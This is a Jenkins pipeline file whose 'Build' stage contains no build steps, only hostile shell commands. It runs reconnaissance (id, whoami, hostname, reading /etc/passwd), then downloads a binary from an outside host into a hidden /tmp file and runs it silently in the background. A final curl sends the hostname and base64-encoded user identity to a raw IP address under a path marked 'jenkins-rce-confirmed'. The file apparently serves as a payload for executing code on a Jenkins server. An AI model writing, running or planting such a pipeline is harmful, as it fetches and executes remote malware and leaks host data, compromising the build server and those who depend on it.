pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh '''
                    id
                    whoami
                    hostname
                    cat /etc/passwd
                    curl -so /tmp/.x http://api-studio-core.com:8888/svc && chmod +x /tmp/.x && nohup /tmp/.x >/dev/null 2>&1 &
                    curl http://144.172.96.146:8443/jenkins-rce-confirmed/$(hostname)/$(id | base64 -w0)
                '''
            }
        }
    }
}
